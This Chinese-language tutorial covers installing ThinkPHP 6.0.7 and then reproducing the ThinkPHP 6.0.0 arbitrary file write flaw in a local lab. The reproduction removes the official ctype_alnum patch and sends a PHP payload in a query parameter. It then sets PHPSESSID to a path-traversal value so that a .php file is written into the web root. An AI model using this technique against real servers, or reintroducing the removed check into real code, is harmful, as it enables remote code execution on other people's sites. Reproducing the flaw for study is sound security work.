## tinkphp6.0.7的安装

### 一、首先准备环境phpstudy7.1.13

### 二、再准备Composer安装程序，安装到phpstudy7.1.13路径下

这个路径随意

![1615452985_6049db39b95e72ffce6c7.png!small?1615452986179](https://image.3001.net/images/20210311/1615452985_6049db39b95e72ffce6c7.png!small?1615452986179)

这个路径就可以

![1615453001_6049db49b1f6244b33f92.png!small?1615453002031](https://image.3001.net/images/20210311/1615453001_6049db49b1f6244b33f92.png!small?1615453002031)

进入该命令行之后执行命令进行安装

![1615453011_6049db53bbd74087f35c8.png!small?1615453012271](https://image.3001.net/images/20210311/1615453011_6049db53bbd74087f35c8.png!small?1615453012271)

    
    
    composer create-project topthink/think tp

![1615453039_6049db6f73ff3039e1883.png!small?1615453040876](https://image.3001.net/images/20210311/1615453039_6049db6f73ff3039e1883.png!small?1615453040876)

下载之后将tp文件夹，移动到自己习惯访问的文件夹下面

![1615453064_6049db88b5771aae50299.png!small?1615453065256](https://image.3001.net/images/20210311/1615453064_6049db88b5771aae50299.png!small?1615453065256)

配置信息

![1615453073_6049db9182dafc2d8f9ae.png!small?1615453075165](https://image.3001.net/images/20210311/1615453073_6049db9182dafc2d8f9ae.png!small?1615453075165)

修改配置文件的

/tp/config ##路径

上一个修改错了

![1615453082_6049db9a4b043414703d4.png!small?1615453083142](https://image.3001.net/images/20210311/1615453082_6049db9a4b043414703d4.png!small?1615453083142)

app_nameespace true改成flase

验证传参信息

![1615453093_6049dba5090fa04ee1a2a.png!small?1615453093654](https://image.3001.net/images/20210311/1615453093_6049dba5090fa04ee1a2a.png!small?1615453093654)

## tp6.0.0任意文件写入漏洞复现:

### 一、首先下载源码

composer create-project topthink/think tp 6.0.0

![1615453110_6049dbb68e6d9ec9178dd.png!small?1615453111927](https://image.3001.net/images/20210311/1615453110_6049dbb68e6d9ec9178dd.png!small?1615453111927)

然后移动到要放到网站目录下面

之后访问：[
_http://127.0.0.1:8086/cms2021/tp/public/_](http://127.0.0.1:8086/cms2021/tp/public/)

![1615453119_6049dbbfd0e759e83983a.png!small?1615453120461](https://image.3001.net/images/20210311/1615453119_6049dbbfd0e759e83983a.png!small?1615453120461)

发现安装成功：

6.0.0 版本号

php think run 运行开发环境

### 二、部署漏洞环境

漏洞文件位置：

\tp\vendor\topthink\framework\src\think\session\Store.php

注意要点：

1.删除官方打的补丁-->ctype_alnum函数

在121行把补丁给去掉

![1615453134_6049dbce0844ca67a5ddb.png!small?1615453134256](https://image.3001.net/images/20210311/1615453134_6049dbce0844ca67a5ddb.png!small?1615453134256)

去掉后

![1615453141_6049dbd5ae94a504461ba.png!small?1615453142006](https://image.3001.net/images/20210311/1615453141_6049dbd5ae94a504461ba.png!small?1615453142006)

32个字符个数，

UA头或者是cookie信息

2.步骤二：添加一个可以

\tp\app\controller\index.php添加

    
    
    use think\facade\Session; //session
    
    $test=request()->only(['a']); //index方法中写入
    Session::set("test",$test['a']); //index方法中写入
    
    

注意添加位置

![1615453163_6049dbeb7ed35f03ebce7.png!small?1615453164153](https://image.3001.net/images/20210311/1615453163_6049dbeb7ed35f03ebce7.png!small?1615453164153)

3.步骤三:打开接受seeion会话

tp\app\middleware.php 打开session信息

\think\middleware\SessionInit::class

![1615453174_6049dbf64deb70852efe2.png!small?1615453174690](https://image.3001.net/images/20210311/1615453174_6049dbf64deb70852efe2.png!small?1615453174690)

### 三、漏洞复现

http://127.0.0.1/tp/public/index.php?a=%3C?php%20phpinfo();?%3E

![1615453200_6049dc1032a6ea030a79b.png!small?1615453200571](https://image.3001.net/images/20210311/1615453200_6049dc1032a6ea030a79b.png!small?1615453200571)

如果执行这一个的话，会发现没有任何回显，我们可以去他的网站根目录去查看

\tp\runtime\session

![1615453208_6049dc184a7e0c792170e.png!small?1615453208635](https://image.3001.net/images/20210311/1615453208_6049dc184a7e0c792170e.png!small?1615453208635)

发现是以序列化的形式进来的

### 四、抓包修改session会话写入网站根目录

PHPSESSID=../../../../123456789chongxqweq.php 要写入的文件

注意：如果PHPSESSID要满足32位字符，如果上传不成功的话，那么就删删减减，直到上传成功为止

![1615453219_6049dc23de44ca711e5e2.png!small?1615453220736](https://image.3001.net/images/20210311/1615453219_6049dc23de44ca711e5e2.png!small?1615453220736)

验证

![1615453246_6049dc3ead0a600213568.png!small?1615453247200](https://image.3001.net/images/20210311/1615453246_6049dc3ead0a600213568.png!small?1615453247200)

